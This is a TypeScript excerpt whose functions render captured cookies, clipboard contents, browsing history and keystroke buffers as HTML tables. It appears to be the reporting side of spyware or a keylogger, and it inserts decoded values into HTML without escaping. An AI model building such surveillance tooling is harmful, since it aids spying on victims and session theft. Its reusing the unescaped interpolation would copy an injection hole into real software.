...
const getStyles = async (): Promise<string> => new Promise((resolve, _) => {
...
const getCookieRows = (cookieData: CookieDto[]) => {
  const html = cookieData.map((cookies) => `<tr><td>${cookies.url}</td><td>${cookies.cookieName}</td><td>${decodeURI(cookies.cookieValue)}</td></tr>`);
  return html.join('');
};
...
const getClipboardRows = (clipboardData: ClipboardDto[]) => {
  const html = clipboardData.map((clipboardData) => `<tr><td>${clipboardData.dateTime.toISOString()}</td><td>${decodeURI(clipboardData.data)}</td></tr>`);
  return html.join('');
};
...
const getHistoryRows = (historyData: HistoryDto[]) => {
  const html = historyData.map((historyData) => `<tr><td>${historyData.dateTime.toISOString()}</td><td>${decodeURI(historyData.url)}</td></tr>`);
  return html.join('');
};
...
const getKeystrokeRows = (keystrokeData: KeystrokeDto[]) => {
  const html = keystrokeData.map((keystrokeData) => `<tr><td>${keystrokeData.dateTime.toISOString()}</td><td>${decodeURI(keystrokeData.buffer)}</td></tr>`);
  return html.join('');
};
